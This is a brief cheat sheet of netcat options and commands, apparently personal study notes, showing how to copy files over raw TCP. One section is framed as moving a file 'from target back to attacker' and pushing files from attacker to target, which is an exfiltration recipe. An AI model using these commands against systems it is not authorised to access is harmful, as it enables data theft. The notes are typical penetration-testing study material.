#nc

nc [options] [host] [port number]

-4 #ip v4
-6 #ip v6
-u #UDP
-r [host] #random port number

-v -vv #verbose and v v


####sending files with netcat######
#1-move from target back to attacker:#
-target: nc -l -p xxxx < filename
-attacker nc x.x.x.x xxxx > filename

#2-push from attacker to target:#
target: nc -l -p xxxx > filename
attacker: nc x.x.x.x xxxx < filename

nc x.x.x.x xxxx < filename.out #send file
nc -l xxxx > filename.in #receive file
